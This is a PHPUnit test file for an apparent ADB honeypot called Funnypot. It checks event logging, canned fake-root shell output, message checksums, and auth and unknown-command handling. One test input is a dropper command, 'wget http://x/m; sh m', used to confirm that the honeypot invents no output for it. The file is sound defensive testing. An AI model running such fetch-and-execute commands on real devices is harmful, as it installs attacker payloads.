<?php

declare(strict_types=1);

namespace Funnypot\Tests\Protocol\Adb;

use Funnypot\Protocol\Adb\AdbConfig;
use Funnypot\Protocol\Adb\AdbServer;
use Funnypot\Protocol\Adb\AdbSession;
use PHPUnit\Framework\TestCase;

final class AdbReconLoggingTest extends TestCase
{
    /** @var array<int,array<string,mixed>> */
    private array $events = [];

    /**
     * @return array{0:AdbServer,1:AdbSession}
     */
    private function connectedAndOpened(string $service): array
    {
        $this->events = [];
        $server = new AdbServer(new AdbConfig(), function (array $e): void {
            $this->events[] = $e;
        });
        $session = new AdbSession('198.51.100.20', 5555, 1);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_CNXN, AdbConfig::VERSION, 262144, "host::features=cmd\x00");
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_OPEN, 5, 0, $service . "\x00");
        $server->processInbound($session);

        return [$server, $session];
    }

    public function test_every_event_carries_the_adb_envelope(): void
    {
        $this->connectedAndOpened('shell:id');

        self::assertNotEmpty($this->events);
        foreach ($this->events as $e) {
            self::assertSame('adb', $e['proto']);
            self::assertSame('ADB', $e['method']);
            self::assertSame(1, $e['matched']);
            self::assertSame(1, $e['served']);
            self::assertArrayHasKey('ts', $e);
            self::assertArrayHasKey('severity', $e);
            self::assertArrayHasKey('event', $e);
            self::assertArrayHasKey('ip', $e);
            self::assertArrayHasKey('port', $e);
            self::assertArrayHasKey('path', $e);
        }
    }

    public function test_connect_banner_is_logged(): void
    {
        $this->connectedAndOpened('shell:id');

        $connect = $this->eventOfType('adb_connect');
        self::assertNotNull($connect);
        self::assertStringContainsString('host::features=cmd', $connect['path']);
        self::assertSame('host::features=cmd', $connect['body']);
        self::assertSame('medium', $connect['severity']);
    }

    public function test_open_command_is_high_severity(): void
    {
        $this->connectedAndOpened('shell:id');

        $open = $this->eventOfType('adb_open');
        self::assertNotNull($open);
        self::assertSame('high', $open['severity']);
    }

    public function test_fake_shell_output_is_canned_and_inert(): void
    {
        // Known recon commands get plausible canned output; the persona is a rooted ARM box.
        self::assertStringContainsString('Linux', AdbServer::fakeShellOutput('shell:uname -a'));
        self::assertStringContainsString('uid=0(root)', AdbServer::fakeShellOutput('shell:id'));
        self::assertStringContainsString('root', AdbServer::fakeShellOutput('shell:whoami'));

        // A dropper command is never fabricated as succeeding: no output is invented for it.
        self::assertSame('', AdbServer::fakeShellOutput('shell:wget http://x/m; sh m'));
    }

    public function test_build_message_and_checksum_roundtrip(): void
    {
        $payload = "device::features=cmd\x00";
        $msg = AdbServer::buildMessage(AdbServer::A_CNXN, AdbConfig::VERSION, 4096, $payload);

        self::assertSame(24 + strlen($payload), strlen($msg));
        self::assertSame(AdbServer::A_CNXN, unpack('V', substr($msg, 0, 4))[1]);
        self::assertSame(AdbConfig::VERSION, unpack('V', substr($msg, 4, 4))[1]);
        self::assertSame(4096, unpack('V', substr($msg, 8, 4))[1]);
        self::assertSame(strlen($payload), unpack('V', substr($msg, 12, 4))[1]);
        self::assertSame(AdbServer::checksum($payload), unpack('V', substr($msg, 16, 4))[1]);
        self::assertSame((AdbServer::A_CNXN ^ 0xFFFFFFFF) & 0xFFFFFFFF, unpack('V', substr($msg, 20, 4))[1]);
        self::assertSame($payload, substr($msg, 24));
    }

    public function test_unknown_command_logs_unknown_and_closes(): void
    {
        $this->events = [];
        $server = new AdbServer(new AdbConfig(), function (array $e): void {
            $this->events[] = $e;
        });
        $session = new AdbSession('192.0.2.9', 5555, 1);
        // A well-formed header (magic matches) but a command we do not model.
        $bogus = 0x11223344;
        $session->inbuf .= pack('V', $bogus) . str_repeat("\x00", 16) . pack('V', ($bogus ^ 0xFFFFFFFF) & 0xFFFFFFFF);
        $server->processInbound($session);

        self::assertNotNull($this->eventOfType('adb_unknown'));
        self::assertTrue($session->close);
    }

    public function test_auth_is_recorded_but_connection_stays_open(): void
    {
        // The device presents as auth-free, so a client offering an AUTH key is recorded and ignored,
        // never answered with a challenge and never closed.
        $this->events = [];
        $server = new AdbServer(new AdbConfig(), function (array $e): void {
            $this->events[] = $e;
        });
        $session = new AdbSession('192.0.2.10', 5555, 1);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_AUTH, 2, 0, str_repeat("\x01", 32));
        $server->processInbound($session);

        self::assertNotNull($this->eventOfType('adb_unknown'));
        self::assertFalse($session->close);
        self::assertSame('', $session->outbuf, 'no A_AUTH challenge is issued');
    }

    public function test_config_from_env(): void
    {
        putenv('FUNNYPOT_ADB_PRODUCT_MODEL=SM-G955F');
        putenv('FUNNYPOT_ADB_FEATURES=cmd,shell_v2,abb_exec');
        $config = AdbConfig::fromEnv();
        self::assertSame('SM-G955F', $config->productModel);
        self::assertStringContainsString('abb_exec', $config->deviceBanner());

        putenv('FUNNYPOT_ADB_PRODUCT_MODEL');
        putenv('FUNNYPOT_ADB_FEATURES');
        $default = AdbConfig::fromEnv();
        self::assertSame('rk3288', $default->productModel);
        self::assertSame('cmd,shell_v2', $default->features);
    }

    /**
     * @return array<string,mixed>|null
     */
    private function eventOfType(string $type): ?array
    {
        foreach ($this->events as $e) {
            if (($e['event'] ?? '') === $type) {
                return $e;
            }
        }

        return null;
    }
}
